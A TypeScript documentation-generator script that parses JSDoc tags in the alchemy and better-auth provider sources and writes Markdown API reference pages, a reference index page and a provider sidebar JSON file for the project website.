import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import * as fs from "node:fs/promises";
import * as path from "node:path";

import * as ts from "typescript-api/unstable/ast";
import type { Node, SourceFile } from "typescript-api/unstable/ast";
import { createSyntaxProject } from "./typescript-source.ts";

const websiteRoot = path.join(import.meta.dir, "../website");

interface SourceRoot {
  /** Directory scanned for documented source files. */
  srcRoot: string;
  /**
   * Synthetic provider name for flat single-provider packages (their files
   * sit directly at `srcRoot`); empty for the alchemy package, whose
   * top-level directories ARE the providers.
   */
  providerPrefix: string;
  /** Display prefix for the page's `Source:` line. */
  sourceDisplayPrefix: string;
}

const config = {
  outRoot: path.join(websiteRoot, "src/content/docs/providers"),
  roots: [
    {
      srcRoot: path.join(import.meta.dir, "../packages/alchemy/src"),
      providerPrefix: "",
      sourceDisplayPrefix: "src",
    },
    {
      srcRoot: path.join(import.meta.dir, "../packages/better-auth/src"),
      providerPrefix: "BetterAuth",
      sourceDisplayPrefix: "packages/better-auth/src",
    },
  ] satisfies SourceRoot[],
};

interface FileEntry {
  /** Output-relative path (provider-prefixed for flat packages). */
  relativePath: string;
  absolutePath: string;
  /** Display path for the page's `Source:` blockquote. */
  sourceDisplay: string;
}

interface ExampleBlock {
  title: string;
  body: string;
}

interface ExampleSection {
  title: string;
  description: string;
  examples: ExampleBlock[];
}

interface PageDoc {
  title: string;
  /** Display path for the `Source:` blockquote. */
  sourceDisplay: string;
  summary: string;
  sections: ExampleSection[];
  /** True for `@layer` pages — renders the Layer metadata line. */
  isLayer: boolean;
  /** Service tags the Layer provides (`@provides`). */
  provides: string[];
  /** Optional peer dependencies (`@peer`). */
  peers: string[];
}

const normalizeSlashes = (value: string) => value.split(path.sep).join("/");

const isSourceFile = (baseName: string) =>
  (baseName.endsWith(".ts") || baseName.endsWith(".tsx")) &&
  !baseName.endsWith(".d.ts") &&
  baseName !== "index.ts";

async function discoverFiles(root: SourceRoot): Promise<FileEntry[]> {
  const entries: FileEntry[] = [];

  // Flat single-provider packages: every file under srcRoot belongs to the
  // synthetic provider directory.
  if (root.providerPrefix) {
    const files = (await fs.readdir(root.srcRoot, {
      recursive: true,
    })) as string[];
    for (const file of files) {
      if (!isSourceFile(path.basename(file))) continue;
      entries.push({
        relativePath: path.join(root.providerPrefix, file),
        absolutePath: path.join(root.srcRoot, file),
        sourceDisplay: `${root.sourceDisplayPrefix}/${normalizeSlashes(file)}`,
      });
    }
    entries.sort((a, b) => a.relativePath.localeCompare(b.relativePath));
    return entries;
  }

  const topLevelEntries = await fs.readdir(root.srcRoot, {
    withFileTypes: true,
  });
  const dirs = topLevelEntries
    .filter((entry) => entry.isDirectory())
    .map((entry) => entry.name);

  for (const dir of dirs) {
    const dirPath = path.join(root.srcRoot, dir);
    let files: string[];
    try {
      files = (await fs.readdir(dirPath, { recursive: true })) as string[];
    } catch {
      continue;
    }

    for (const file of files) {
      if (!isSourceFile(path.basename(file))) continue;

      const relativePath = path.join(dir, file);
      entries.push({
        relativePath,
        absolutePath: path.join(root.srcRoot, relativePath),
        sourceDisplay: `${root.sourceDisplayPrefix}/${normalizeSlashes(relativePath)}`,
      });
    }
  }

  entries.sort((a, b) => a.relativePath.localeCompare(b.relativePath));
  return entries;
}

function getJsDocText(node: Node): string {
  return node.jsDoc?.map((doc) => doc.getText()).join("\n") ?? "";
}

function cleanDocComment(raw: string): string {
  return raw
    .replace(/^\/\*\*?/, "")
    .replace(/\*\/$/, "")
    .split("\n")
    .map((line) => line.replace(/^\s*\*\s?/, ""))
    .join("\n");
}

interface ParsedJSDoc {
  summary: string;
  sections: ExampleSection[];
  hasResourceTag: boolean;
  hasBindingTag: boolean;
  /** `@layer` — a Layer factory providing a Context service. */
  hasLayerTag: boolean;
  /** `@provides <Service.Tag>` — service tags the Layer satisfies. */
  provides: string[];
  /** `@peer <package>` — optional peer dependencies the Layer needs. */
  peers: string[];
  category: string;
  product: string;
}

function parseJSDoc(node: Node): ParsedJSDoc {
  const raw = getJsDocText(node);
  if (!raw) {
    return {
      summary: "",
      sections: [],
      hasResourceTag: false,
      hasBindingTag: false,
      hasLayerTag: false,
      provides: [],
      peers: [],
      category: "",
      product: "",
    };
  }

  const lines = cleanDocComment(raw).split("\n");

  const summaryLines: string[] = [];
  const sections: ExampleSection[] = [];
  const provides: string[] = [];
  const peers: string[] = [];
  let hasResourceTag = false;
  let hasBindingTag = false;
  let hasLayerTag = false;
  let category = "";
  let product = "";
  let sawTag = false;
  let currentSection: ExampleSection | undefined;
  let currentExample: ExampleBlock | undefined;

  let sectionDescLines: string[] = [];
  let collectingSectionDesc = false;
  let insideFence = false;

  const flushExample = () => {
    if (!currentExample) return;
    currentExample.body = currentExample.body.trim();
    if (!currentSection) {
      currentSection = { title: "Examples", description: "", examples: [] };
      sections.push(currentSection);
    }
    currentSection.examples.push(currentExample);
    currentExample = undefined;
  };

  const flushSectionDesc = () => {
    if (currentSection && sectionDescLines.length > 0) {
      currentSection.description = sectionDescLines.join("\n").trim();
    }
    sectionDescLines = [];
    collectingSectionDesc = false;
  };

  for (const line of lines) {
    // Track fenced code blocks so an `@`-prefixed line inside an example
    // (e.g. a decorator) is never mistaken for a JSDoc tag.
    if (line.trim().startsWith("```")) {
      insideFence = !insideFence;
    }

    const proseHeading = insideFence
      ? null
      : line.trim().match(/^###\s+(.+?)\s+<!-- api-prose -->$/);
    if (proseHeading) {
      if (!sawTag) summaryLines.push(`### ${proseHeading[1]!.trim()}`);
      continue;
    }

    const section = insideFence ? null : line.trim().match(/^###\s+(.+)$/);
    if (section) {
      sawTag = true;
      flushExample();
      flushSectionDesc();
      currentSection = {
        title: section[1]!.trim(),
        description: "",
        examples: [],
      };
      sections.push(currentSection);
      collectingSectionDesc = true;
      continue;
    }

    const example = insideFence
      ? null
      : line.trim().match(/^\*\*Example:\*\*\s*(.*)$/);
    if (example) {
      sawTag = true;
      flushSectionDesc();
      flushExample();
      currentExample = {
        title: example[1]!.trim() || "Example",
        body: "",
      };
      continue;
    }

    const tag = insideFence ? null : line.trim().match(/^@(\w+)\s*(.*)$/);
    if (tag) {
      sawTag = true;
      const [, name, rest] = tag;
      const value = (rest ?? "").trim();
      switch (name) {
        case "resource":
          hasResourceTag = true;
          break;
        case "binding":
          hasBindingTag = true;
          break;
        case "layer":
          hasLayerTag = true;
          break;
        case "provides":
          if (value) provides.push(value);
          break;
        case "peer":
          if (value) peers.push(value);
          break;
        case "category":
        case "group":
          if (value) category = value;
          break;
        case "product":
        case "label":
          if (value) product = value;
          break;
        case "section":
          flushExample();
          flushSectionDesc();
          currentSection = {
            title: value || "Examples",
            description: "",
            examples: [],
          };
          sections.push(currentSection);
          collectingSectionDesc = true;
          break;
        case "example":
          flushSectionDesc();
          flushExample();
          currentExample = { title: value || "Example", body: "" };
          break;
      }
      continue;
    }

    if (!sawTag) {
      summaryLines.push(line);
      continue;
    }

    if (currentExample) {
      currentExample.body += `${line}\n`;
    } else if (collectingSectionDesc) {
      sectionDescLines.push(line);
    }
  }

  flushSectionDesc();
  flushExample();

  return {
    summary: summaryLines.join("\n").trim(),
    sections,
    hasResourceTag,
    hasBindingTag,
    hasLayerTag,
    provides,
    peers,
    category,
    product,
  };
}

function declName(node: Node): string {
  if (ts.isVariableStatement(node)) {
    return node.declarationList.declarations[0]?.name.getText() ?? "";
  }
  if (
    ts.isClassDeclaration(node) ||
    ts.isInterfaceDeclaration(node) ||
    ts.isTypeAliasDeclaration(node)
  ) {
    return node.name?.getText() ?? "";
  }
  return "";
}

interface Primary {
  name: string;
  doc: ParsedJSDoc;
  category: string;
  product: string;
}

const hasContent = (doc: ParsedJSDoc) =>
  Boolean(doc.summary) || doc.sections.length > 0;

/**
 * Map a public export name back to its local declaration name when a file
 * re-exports under an alias, e.g. `export { VpcLinkResource as VpcLink }`
 * lets us find the documented `VpcLinkResource` const from the tagged
 * `VpcLink` interface.
 */
export function exportedNames(sourceFile: SourceFile): string[] {
  const names = new Set<string>();
  const addBinding = (name: ts.BindingName): void => {
    if (ts.isIdentifier(name)) names.add(name.text);
    else
      for (const element of name.elements) {
        if (ts.isBindingElement(element) && element.name)
          addBinding(element.name);
      }
  };
  for (const statement of sourceFile.statements) {
    if (ts.isExportDeclaration(statement)) {
      if (statement.exportClause && ts.isNamedExports(statement.exportClause)) {
        for (const spec of statement.exportClause.elements)
          names.add(spec.name.text);
      } else if (
        statement.exportClause &&
        ts.isNamespaceExport(statement.exportClause)
      ) {
        names.add(statement.exportClause.name.text);
      }
    } else if (ts.isExportAssignment(statement)) {
      if (!statement.isExportEquals) names.add("default");
    } else if (
      (ts.isVariableStatement(statement) ||
        ts.isClassDeclaration(statement) ||
        ts.isFunctionDeclaration(statement) ||
        ts.isInterfaceDeclaration(statement) ||
        ts.isTypeAliasDeclaration(statement) ||
        ts.isEnumDeclaration(statement) ||
        ts.isModuleDeclaration(statement) ||
        ts.isImportEqualsDeclaration(statement)) &&
      statement.modifierFlags & ts.ModifierFlags.Export
    ) {
      if (statement.modifierFlags & ts.ModifierFlags.Default)
        names.add("default");
      else if (ts.isVariableStatement(statement)) {
        for (const declaration of statement.declarationList.declarations)
          addBinding(declaration.name);
      } else if (
        ts.isClassDeclaration(statement) ||
        ts.isFunctionDeclaration(statement) ||
        ts.isInterfaceDeclaration(statement) ||
        ts.isTypeAliasDeclaration(statement) ||
        ts.isEnumDeclaration(statement) ||
        ts.isModuleDeclaration(statement) ||
        ts.isImportEqualsDeclaration(statement)
      ) {
        if (statement.name) names.add(statement.name.text);
      }
    }
  }
  return [...names];
}

function localNameForExport(
  sourceFile: SourceFile,
  publicName: string,
): string | undefined {
  for (const ed of sourceFile.statements.filter(ts.isExportDeclaration)) {
    if (ed.moduleSpecifier) continue;
    for (const spec of ed.exportClause && ts.isNamedExports(ed.exportClause)
      ? ed.exportClause.elements
      : []) {
      if (spec.name.text === publicName) {
        return (spec.propertyName ?? spec.name).text;
      }
    }
  }
  return undefined;
}

/**
 * The page for a file is owned by the single exported declaration tagged
 * `@resource` or `@binding`, and named after it. Authors sometimes write the
 * docs (summary/@section/@example) on a sibling declaration of the same name
 * (an `interface X` paired with `const X`) or on an internal const that is
 * re-exported under the tagged name (the ApiGateway `XResource as X` pattern).
 * When the tagged declaration itself has no content, pull it from that related
 * declaration so the page isn't dropped as empty.
 */
export function findTaggedPrimary(sourceFile: SourceFile): Primary | undefined {
  const candidates: Node[] = [
    ...sourceFile.statements
      .filter(ts.isVariableStatement)
      .filter((s) => Boolean(s.modifierFlags & ts.ModifierFlags.Export)),
    ...sourceFile.statements
      .filter(ts.isClassDeclaration)
      .filter((c) => Boolean(c.modifierFlags & ts.ModifierFlags.Export)),
    ...sourceFile.statements
      .filter(ts.isInterfaceDeclaration)
      .filter((i) => Boolean(i.modifierFlags & ts.ModifierFlags.Export)),
  ];

  for (const node of candidates) {
    const doc = parseJSDoc(node);
    if (!doc.hasResourceTag && !doc.hasBindingTag && !doc.hasLayerTag) {
      continue;
    }
    const name = declName(node);
    if (!name) continue;
    const category = doc.category;
    const product = doc.product;
    if (hasContent(doc)) return { name, doc, category, product };

    // Tagged declaration has no prose — look for the related declaration that
    // carries the docs (same name, or re-exported under this name).
    const localName = localNameForExport(sourceFile, name);
    const related: Node[] = [
      ...sourceFile.statements.filter(ts.isVariableStatement),
      ...sourceFile.statements.filter(ts.isClassDeclaration),
      ...sourceFile.statements.filter(ts.isInterfaceDeclaration),
      ...sourceFile.statements.filter(ts.isTypeAliasDeclaration),
    ].filter((d) => {
      if (d === node) return false;
      const dn = declName(d);
      return dn === name || (localName !== undefined && dn === localName);
    });

    let best: ParsedJSDoc | undefined;
    for (const d of related) {
      const pd = parseJSDoc(d);
      if (pd.sections.length > 0) {
        best = pd;
        break;
      }
      if (!best && pd.summary) best = pd;
    }
    // Borrowed prose keeps the TAGGED declaration's kind + metadata.
    const merged: ParsedJSDoc = {
      ...(best ?? doc),
      hasResourceTag: doc.hasResourceTag,
      hasBindingTag: doc.hasBindingTag,
      hasLayerTag: doc.hasLayerTag,
      provides: doc.provides,
      peers: doc.peers,
    };
    return { name, doc: merged, category, product };
  }
  return undefined;
}

const LINK_TAG_RE = /\{@link\s+([^}]+)\}/g;

/** Split a `{@link ...}` tag's inner text into target + optional label. */
function parseLinkTag(inner: string): { target: string; label?: string } {
  const trimmed = inner.trim();
  const pipe = trimmed.indexOf("|");
  if (pipe !== -1) {
    return {
      target: trimmed.slice(0, pipe).trim(),
      label: trimmed.slice(pipe + 1).trim() || undefined,
    };
  }
  const space = trimmed.search(/\s/);
  if (space !== -1) {
    return {
      target: trimmed.slice(0, space).trim(),
      label: trimmed.slice(space + 1).trim() || undefined,
    };
  }
  return { target: trimmed };
}

/**
 * Reduce a typedoc-style `import("./Secrets.ts").Secrets` target to the bare
 * symbol name — resolution (same-directory first) and display both want the
 * name, not the module expression.
 */
function normalizeLinkTarget(target: string): string {
  const match = target.match(/^import\((["'])[^"']+\1\)\.(.+)$/);
  return match ? match[2] : target;
}

/** Resolves a `{@link}` symbol target to a generated page URL, if any. */
type LinkResolver = (target: string) => string | undefined;

/**
 * Build a per-page resolver factory. A symbol resolves to another generated
 * page preferring (in order): a same-directory page named after it, a
 * same-directory page whose source file exports it (an access-level service
 * like `ReadNamespace` documented on its `ReadWriteNamespace` page), a unique
 * name match within the same provider, a unique exporter within the same
 * provider, then a unique global name match. Member suffixes
 * (`Cluster#capacityProviders`), provider-qualified names (`Cloudflare.Worker`)
 * and `FooProps` interfaces resolve to the base resource's page.
 */
function makeLinkResolverFactory(
  pages: PageEntry[],
): (fromDir: string) => LinkResolver {
  const byName = new Map<string, PageEntry[]>();
  const byExport = new Map<string, PageEntry[]>();
  for (const p of pages) {
    if (!byName.has(p.resource)) byName.set(p.resource, []);
    byName.get(p.resource)!.push(p);
    for (const name of p.exports) {
      if (!byExport.has(name)) byExport.set(name, []);
      byExport.get(name)!.push(p);
    }
  }
  const providers = new Set(pages.map((p) => p.provider));

  return (fromDir: string) => {
    const fromProvider = fromDir.split("/")[0] ?? "";

    const lookup = (name: string, provider?: string): PageEntry | undefined => {
      const scope = (list: PageEntry[] | undefined) =>
        (list ?? []).filter((c) => !provider || c.provider === provider);
      const named = scope(byName.get(name));
      const exporting = scope(byExport.get(name));

      const sameDirNamed = named.filter((c) => c.dir === fromDir);
      if (sameDirNamed.length === 1) return sameDirNamed[0];
      const sameDirExporting = exporting.filter((c) => c.dir === fromDir);
      if (sameDirExporting.length === 1) return sameDirExporting[0];
      const providerNamed = named.filter((c) => c.provider === fromProvider);
      if (providerNamed.length === 1) return providerNamed[0];
      const providerExporting = exporting.filter(
        (c) => c.provider === fromProvider,
      );
      if (providerExporting.length === 1) return providerExporting[0];
      if (named.length === 1) return named[0];
      return undefined;
    };

    return (target: string) => {
      // Strip a `#member` suffix — the link lands on the owning resource page.
      const base = target.split("#")[0];

      const attempts: { name: string; provider?: string }[] = [{ name: base }];
      if (base.includes(".")) {
        const segments = base.split(".");
        const first = segments[0];
        const last = segments[segments.length - 1];
        if (providers.has(first)) {
          // Provider-qualified: `Cloudflare.Worker`, `Cloudflare.KV.Namespace`.
          attempts.push({ name: last, provider: first });
        } else {
          // Member access on a symbol: `KeyPairProps.publicKeyMaterial`.
          attempts.push({ name: first });
          if (first.endsWith("Props")) {
            attempts.push({ name: first.slice(0, -"Props".length) });
          }
        }
      } else if (base.endsWith("Props")) {
        attempts.push({ name: base.slice(0, -"Props".length) });
      }

      for (const attempt of attempts) {
        const found = lookup(attempt.name, attempt.provider);
        if (found) return found.link;
      }
      return undefined;
    };
  };
}

const isUrl = (target: string) => /^https?:\/\//.test(target);

/**
 * Replace `{@link ...}` tags with markdown links, skipping fenced code
 * blocks. Symbols that don't resolve to a generated page render as inline
 * code (or their label) instead of leaking the raw tag.
 */
/** Symbol targets that didn't resolve to a page, for the end-of-run summary. */
const unresolvedLinkTargets = new Map<string, number>();

function linkifyMarkdown(markdown: string, resolve: LinkResolver): string {
  const replaceTags = (chunk: string) =>
    chunk.replace(LINK_TAG_RE, (_, inner: string) => {
      // A tag wrapped across source lines carries the line break in its
      // label — collapse it so the markdown link stays intact.
      const parsed = parseLinkTag(inner.replace(/\s+/g, " "));
      const label = parsed.label;
      if (isUrl(parsed.target)) {
        return `[${label ?? parsed.target}](${parsed.target})`;
      }
      const target = normalizeLinkTarget(parsed.target);
      const url = resolve(target);
      if (!url) {
        unresolvedLinkTargets.set(
          target,
          (unresolvedLinkTargets.get(target) ?? 0) + 1,
        );
      }
      const text = label ?? `\`${target}\``;
      return url ? `[${text}](${url})` : text;
    });

  // Apply across contiguous non-fence chunks (a `{@link}` may span lines);
  // leave fenced code blocks untouched.
  const out: string[] = [];
  let chunk: string[] = [];
  let insideFence = false;
  const flushChunk = () => {
    if (chunk.length > 0) {
      out.push(replaceTags(chunk.join("\n")));
      chunk = [];
    }
  };
  for (const line of markdown.split("\n")) {
    if (line.trim().startsWith("```")) {
      if (!insideFence) flushChunk();
      insideFence = !insideFence;
      out.push(line);
      continue;
    }
    if (insideFence) {
      out.push(line);
    } else {
      chunk.push(line);
    }
  }
  flushChunk();
  return out.join("\n");
}

/** Reduce `{@link ...}` tags to plain text for frontmatter descriptions. */
function stripLinkTags(text: string): string {
  return text.replace(LINK_TAG_RE, (_, inner: string) => {
    const { target, label } = parseLinkTag(inner.replace(/\s+/g, " "));
    return (label ?? normalizeLinkTarget(target)).replace(/`/g, "");
  });
}

function yamlString(value: string): string {
  if (/[\n:"{}[\],&*?|>!%@`#]/.test(value) || value.trim() !== value) {
    return JSON.stringify(value);
  }
  return value;
}

function firstParagraph(value: string): string {
  const idx = value.indexOf("\n\n");
  const para = idx === -1 ? value : value.slice(0, idx);
  return para.replace(/\s+/g, " ").trim();
}

function renderPageBody(doc: PageDoc): string {
  const parts: string[] = [];

  if (doc.summary) {
    parts.push(doc.summary);
  }

  for (const section of doc.sections) {
    const secParts = [`## ${section.title}`];
    if (section.description) {
      secParts.push(section.description);
    }
    for (const example of section.examples) {
      if (section.examples.length > 1) {
        secParts.push(`**${example.title}**`);
      }
      secParts.push(example.body);
    }
    parts.push(secParts.join("\n\n"));
  }

  return parts.join("\n\n");
}

function renderPage(doc: PageDoc, resolve: LinkResolver): string {
  const description =
    stripLinkTags(firstParagraph(doc.summary)) ||
    `API reference for ${doc.title}`;
  const frontmatter = [
    "---",
    `title: ${yamlString(doc.title)}`,
    `description: ${yamlString(description)}`,
    // Generated reference pages are ~4k near-identical one-paragraph +
    // one-snippet stubs (92% of the site). Indexed as separate documents
    // they read as programmatic thin content, dilute crawl budget, and are
    // what surfaces as "random" search results instead of the hub and
    // guide pages. Keep them navigable and crawlable (`follow`) but out of
    // search indexes; the sitemap integration drops any page carrying this
    // meta. Revisit once pages are consolidated per service / carry real
    // prose — this is the only line to change.
    "head:",
    "  - tag: meta",
    "    attrs:",
    "      name: robots",
    '      content: "noindex, follow"',
    "---",
  ].join("\n");

  const headerLines = [`> **Source:** \`${doc.sourceDisplay}\``];
  if (doc.isLayer) {
    const meta = ["**Kind:** Layer"];
    if (doc.provides.length > 0) {
      meta.push(
        `**Provides:** ${doc.provides.map((tag) => `\`${tag}\``).join(", ")}`,
      );
    }
    if (doc.peers.length > 0) {
      meta.push(
        `**Peer dependencies:** ${doc.peers
          .map((peer) => `\`${peer}\``)
          .join(", ")}`,
      );
    }
    headerLines.push(`> ${meta.join(" · ")}`);
  }
  const sourceBlock = headerLines.join("\n");
  const body = linkifyMarkdown(renderPageBody(doc).trim(), resolve);

  if (body) {
    return `${frontmatter}\n\n${sourceBlock}\n\n${body}\n`;
  }
  return `${frontmatter}\n\n${sourceBlock}\n`;
}

/** Providers shown first in the sidebar; the rest follow alphabetically. */
const PROVIDER_ORDER = ["AWS", "Cloudflare"];

/**
 * Uncategorized providers with at most this many pages render as a flat
 * resource list instead of per-service folders (see buildProvidersSidebar).
 */
const FLAT_PROVIDER_MAX_PAGES = 16;

interface SidebarLeaf {
  label: string;
  link: string;
}
interface SidebarGroup {
  label: string;
  collapsed: true;
  items: SidebarItem[];
}
type SidebarItem = SidebarLeaf | SidebarGroup;

interface PageEntry {
  provider: string;
  service: string;
  resource: string;
  category: string;
  product: string;
  link: string;
  /** Source directory relative to srcRoot (slash-normalized), e.g. `Cloudflare/KV`. */
  dir: string;
  /** All names the page's source file exports — `{@link}` targets documented on this page. */
  exports: string[];
}

const byLabel = (a: { label: string }, b: { label: string }) =>
  a.label.localeCompare(b.label);

function orderedKeys(keys: string[], order: string[]): string[] {
  const ranked = keys.filter((k) => order.includes(k));
  ranked.sort((a, b) => order.indexOf(a) - order.indexOf(b));
  const rest = keys.filter((k) => !order.includes(k)).sort();
  return [...ranked, ...rest];
}

/**
 * Build sidebar items for one set of pages sharing a provider+category:
 * every product is its own collapsible folder containing its resource
 * pages, mirroring how Cloudflare's API reference gives each product its
 * own section — even single-page products like D1 or Organization — so
 * the grouping is uniform.
 *
 * Grouping is by resolved product LABEL (`@product`, falling back to the
 * service dir name), not by directory: two directories declaring the same
 * product merge into one group instead of rendering duplicate siblings.
 *
 * A group that would hold exactly one page named the same as the group
 * (a flat provider dir where the label falls back to the resource name,
 * e.g. "Certificate > Certificate") carries no information — collapse it
 * to a plain leaf. Genuine single-page products keep their folder (the
 * label differs, e.g. Cloudflare's "D1 > Database").
 */
function buildServiceItems(pages: PageEntry[]): SidebarItem[] {
  const byLabelKey = new Map<string, PageEntry[]>();
  for (const p of pages) {
    const key = p.product || p.service || p.resource;
    if (!byLabelKey.has(key)) byLabelKey.set(key, []);
    byLabelKey.get(key)!.push(p);
  }
  const items: SidebarItem[] = [];
  for (const [label, productPages] of byLabelKey) {
    if (productPages.length === 1 && productPages[0].resource === label) {
      items.push({ label, link: productPages[0].link });
      continue;
    }
    items.push({
      label,
      collapsed: true,
      items: productPages
        .map((p) => ({ label: p.resource, link: p.link }))
        .sort(byLabel),
    });
  }
  return items.sort(byLabel);
}

function buildProvidersSidebar(entries: PageEntry[]): SidebarItem[] {
  const byProvider = new Map<string, PageEntry[]>();
  for (const e of entries) {
    if (!byProvider.has(e.provider)) byProvider.set(e.provider, []);
    byProvider.get(e.provider)!.push(e);
  }

  const providers: SidebarGroup[] = [];
  for (const provider of orderedKeys([...byProvider.keys()], PROVIDER_ORDER)) {
    const pages = byProvider.get(provider)!;

    // `@category` is per-file; a documented file that omits it must not fall
    // out of its service's category and render a duplicate service group at
    // the provider root. Inherit the category any sibling page of the same
    // service dir declares.
    const categoryByService = new Map<string, string>();
    for (const p of pages) {
      if (p.service && p.category && !categoryByService.has(p.service)) {
        categoryByService.set(p.service, p.category);
      }
    }

    const categorized = new Map<string, PageEntry[]>();
    const uncategorized: PageEntry[] = [];
    for (const p of pages) {
      const category = p.category || categoryByService.get(p.service) || "";
      if (category) {
        if (!categorized.has(category)) categorized.set(category, []);
        categorized.get(category)!.push(p);
      } else {
        uncategorized.push(p);
      }
    }

    const items: SidebarItem[] = [];
    for (const cat of [...categorized.keys()].sort((a, b) =>
      a.localeCompare(b),
    )) {
      items.push({
        label: cat,
        collapsed: true,
        items: buildServiceItems(categorized.get(cat)!),
      });
    }
    if (categorized.size === 0 && pages.length <= FLAT_PROVIDER_MAX_PAGES) {
      // Small uncategorized providers (Neon, Planetscale, Axiom, GitHub, …)
      // render as a flat resource list — per-service folders around one or
      // two pages ("Branch > Branch") are redundant nesting, and prefixed
      // resource names (MySQLBranch/PostgresBranch) already carry the
      // grouping information.
      items.push(
        ...uncategorized
          .map((p) => ({ label: p.resource, link: p.link }))
          .sort(byLabel),
      );
    } else {
      // Pages without a category fall back to service grouping directly under
      // the provider (this is how AWS renders until it gets categorized).
      items.push(...buildServiceItems(uncategorized));
    }

    providers.push({ label: provider, collapsed: true, items });
  }

  assertNoDuplicateSiblings(providers, []);
  return providers;
}

/**
 * Duplicate sibling labels are always a tagging bug (e.g. two products
 * resolving to the same name in one category) and render as confusing
 * twin sections — fail the generation instead of shipping them.
 */
function assertNoDuplicateSiblings(items: SidebarItem[], path: string[]) {
  const seen = new Map<string, number>();
  for (const item of items) {
    seen.set(item.label, (seen.get(item.label) ?? 0) + 1);
  }
  const dups = [...seen.entries()].filter(([, n]) => n > 1);
  if (dups.length > 0) {
    throw new Error(
      `Duplicate sidebar sibling label(s) under "${path.join(" > ") || "(root)"}": ${dups
        .map(([label, n]) => `"${label}" ×${n}`)
        .join(", ")} — fix the @product/@category tags on the offending files.`,
    );
  }
  for (const item of items) {
    if ("items" in item) {
      assertNoDuplicateSiblings(item.items, [...path, item.label]);
    }
  }
}

async function main() {
  await fs.rm(config.outRoot, { recursive: true, force: true });
  await fs.mkdir(config.outRoot, { recursive: true });

  const seen = new Map<string, string>();
  const pageEntries: PageEntry[] = [];
  const pending: { outputRelative: string; doc: PageDoc }[] = [];
  let written = 0;
  let skipped = 0;

  for (const root of config.roots) {
    const entries = await discoverFiles(root);
    console.log(
      `Discovered ${entries.length} source files in ${normalizeSlashes(
        path.relative(path.join(import.meta.dir, ".."), root.srcRoot),
      )}.`,
    );

    await using syntax = await createSyntaxProject(
      entries.map((entry) => entry.absolutePath),
    );

    for (const entry of entries) {
      const sourceFile = await syntax.project.program.getSourceFile(
        entry.absolutePath,
      );
      if (!sourceFile) {
        throw new Error(`Missing source file ${entry.absolutePath}`);
      }

      const primary = findTaggedPrimary(sourceFile);
      if (!primary) {
        skipped++;
        continue;
      }

      // Only emit a page when there's actual documented content; a bare
      // frontmatter + source link stub is noise.
      if (!primary.doc.summary && primary.doc.sections.length === 0) {
        skipped++;
        continue;
      }

      // Mirror the source directory structure; name the page after the
      // tagged declaration (e.g. Cloudflare.AI.Search/AiSearchInstance.md).
      const relDir = path.dirname(entry.relativePath);
      const outputRelative = path.join(relDir, `${primary.name}.md`);

      const existing = seen.get(outputRelative);
      if (existing) {
        console.warn(
          `  collision: ${outputRelative} from ${entry.relativePath} (already from ${existing})`,
        );
      }
      seen.set(outputRelative, entry.relativePath);

      const doc: PageDoc = {
        title: primary.name,
        sourceDisplay: entry.sourceDisplay,
        summary: primary.doc.summary,
        sections: primary.doc.sections,
        isLayer: primary.doc.hasLayerTag,
        provides: primary.doc.provides,
        peers: primary.doc.peers,
      };
      pending.push({ outputRelative, doc });

      const exportNames = exportedNames(sourceFile);

      const segments = normalizeSlashes(outputRelative).split("/");
      pageEntries.push({
        provider: segments[0] ?? "",
        service: segments.length > 2 ? segments[1] : "",
        resource: primary.name,
        category: primary.category,
        product: primary.product,
        link: `/providers/${normalizeSlashes(outputRelative)
          .replace(/\.md$/, "")
          .toLowerCase()}`,
        dir: normalizeSlashes(relDir),
        exports: exportNames,
      });
    }
  }

  // Second pass: render with `{@link}` resolution — the full page set must be
  // known before symbol targets can resolve to their pages.
  const resolverFor = makeLinkResolverFactory(pageEntries);
  for (const page of pending) {
    const resolve = resolverFor(
      normalizeSlashes(path.dirname(page.outputRelative)),
    );
    const outputPath = path.join(config.outRoot, page.outputRelative);
    await fs.mkdir(path.dirname(outputPath), { recursive: true });
    await fs.writeFile(outputPath, renderPage(page.doc, resolve), "utf8");
    written++;
  }

  const sidebar = buildProvidersSidebar(pageEntries);

  // Landing page for the Reference tab (/providers): a provider directory.
  // Each provider's reference belongs to its docs hub — the directory just
  // routes there (or into the tree, for providers without a hub). The
  // ProviderDirectory component reads the generated sidebar for counts.
  // Regenerated with the rest of the tree on every run.
  const referenceIndex = [
    "---",
    "title: API Reference",
    "description: Every provider alchemy can manage — pick a provider to open its docs hub and resource reference.",
    "---",
    "",
    'import ProviderDirectory from "../../../components/ProviderDirectory.astro";',
    "",
    "Every resource alchemy can manage, documented from the source JSDoc and",
    "organized by provider. A provider's reference lives in its docs hub —",
    "pick one below, or search with `⌘K`.",
    "",
    "<ProviderDirectory />",
    "",
  ].join("\n");
  await fs.rm(path.join(config.outRoot, "index.md"), { force: true });
  await fs.writeFile(
    path.join(config.outRoot, "index.mdx"),
    referenceIndex,
    "utf8",
  );

  const sidebarPath = path.join(
    websiteRoot,
    "src/generated/providers-sidebar.json",
  );
  await fs.mkdir(path.dirname(sidebarPath), { recursive: true });
  await fs.writeFile(
    sidebarPath,
    `${JSON.stringify(sidebar, null, 2)}\n`,
    "utf8",
  );

  console.log(
    `Done. Wrote ${written} resource pages (skipped ${skipped} untagged) to ${normalizeSlashes(
      path.relative(path.join(import.meta.dir, ".."), config.outRoot),
    )}.`,
  );
  if (unresolvedLinkTargets.size > 0) {
    const list = [...unresolvedLinkTargets.entries()]
      .sort((a, b) => b[1] - a[1])
      .map(([target, n]) => (n > 1 ? `${target} ×${n}` : target))
      .join(", ");
    console.log(
      `{@link} targets without a page (rendered as inline code): ${list}`,
    );
  }
  console.log(
    `Wrote provider sidebar to ${normalizeSlashes(
      path.relative(path.join(import.meta.dir, ".."), sidebarPath),
    )}.`,
  );
}

if (import.meta.main) await main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                